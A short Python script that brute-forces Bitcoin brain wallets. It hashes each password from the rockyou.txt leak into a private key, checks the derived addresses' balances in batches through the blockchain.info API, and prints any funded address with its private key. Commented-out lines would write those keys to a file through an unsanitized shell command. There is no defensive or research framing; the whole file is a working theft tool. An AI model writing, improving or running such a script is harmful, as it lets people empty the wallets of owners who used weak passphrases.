#!/usr/bin/python3

from bitcoin import *
import requests
import json
import os

list = []

with open("E:/rockyou.txt", errors="ignore") as fp:
    file_name = os.path.basename(fp.name)
    print(file_name)
    for i, line in enumerate(fp):
        if i > int(open('state', 'r').read().split(":")[1]):
            if len(list) < 128:
                wallet = [sha256(line), pubtoaddr(privtopub(sha256(line)))]
                list.append(wallet)

            else:
                #print(list)
                addresses = ""
                for y in range(0, 128):
                    addresses += str(list[y][1])

                    if y < 127:
                        addresses += "|"

                req2 = requests.get("https://blockchain.info/balance?active=%s" % addresses)
                content2 = req2.content

                addresses2 = json.loads(content2.decode("utf-8"))
                for xy in addresses2:
                    if addresses2['%s' % xy]['final_balance'] != 0:
                        for xyz in range(0, 128):
                            if list[xyz][1] == xy:
                                output = ("PublicKey:%s Balance:%s PrivateKey:%s" % (
                                          xy, addresses2['%s' % xy]['final_balance'], list[xyz][0]))
                                print(output)
                                #os.system('echo %s >> /home/pi/keys.txt' % output)

                    if addresses2['%s' % xy]['total_received'] != 0:
                        for xyz in range(0, 128):
                            if list[xyz][1] == xy:
                                output = ("PublicKey:%s Received:%s PrivateKey:%s" % (
                                          xy, addresses2['%s' % xy]['total_received'], list[xyz][0]))
                                print(output)
                                #os.system('echo %s >> /home/pi/keys.txt' % output)

                list = []
                f = open("state", "w")
                f.write("%s:%s" % (file_name, i))
                f.close()
